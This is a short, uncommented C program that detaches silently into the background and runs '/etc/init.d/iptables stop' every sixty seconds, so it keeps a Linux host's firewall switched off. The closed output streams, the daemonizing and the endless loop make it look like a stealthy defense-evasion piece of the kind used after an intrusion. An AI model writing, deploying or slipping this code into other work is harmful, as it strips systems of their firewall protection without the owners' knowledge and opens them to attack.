#include <unistd.h>
#include <stdlib.h>
#include <wait.h>

void stop()
{
	pid_t pid;
	close (0); close (1); close (2);
	pid = fork();
	if (pid < 0)
	{
		exit (EXIT_FAILURE);
	}
	if (pid > 0)
	{
		exit (EXIT_SUCCESS);
	}
	if (pid == 0)
	{
		setsid();
		while (1)
		{
			pid = fork();
			if (pid == 0)
			{
				execl ("/etc/init.d/iptables","iptables","stop", (char *)0);
			}
			wait (NULL);
			sleep (60);
		}
	}
}

int main()
{
	stop();
	return 0;
}
